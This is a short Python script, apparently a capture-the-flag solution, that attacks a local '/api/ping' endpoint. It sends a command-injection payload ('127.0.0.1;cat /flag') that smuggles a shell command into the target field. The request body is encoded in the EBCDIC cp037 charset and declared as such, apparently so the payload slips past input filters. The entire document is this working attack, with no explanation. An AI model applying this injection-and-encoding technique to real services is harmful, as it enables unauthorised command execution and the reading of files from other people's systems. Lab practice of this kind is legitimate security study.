import requests
import json
url="http://127.0.0.1:58929/api/ping"
encoding="cp037"

json_data={"target":"127.0.0.1;cat /flag"}
json_str=json.dumps(json_data)
encoded_data=json_str.encode(encoding)

headers={"Content_Type":f"application/json;charset={encoding}"}


response=requests.post(url,data=encoded_data,headers=headers)

print(response.status_code)
print(response.text)